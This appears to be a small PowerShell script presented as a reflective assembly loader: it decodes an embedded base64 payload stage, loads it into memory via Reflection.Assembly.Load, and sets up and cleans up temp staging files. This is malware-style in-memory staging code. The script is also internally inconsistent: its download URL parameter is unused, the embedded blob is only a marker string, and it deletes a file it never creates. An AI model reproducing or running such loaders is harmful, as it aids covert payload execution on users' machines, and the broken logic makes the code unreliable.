
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://localhost:8000/payload.bin',
    [int]$TimeoutSec = 143
)
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpsbXU2c2J6M3Z5')
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$ResultObject = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $ResultObject) {
    Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
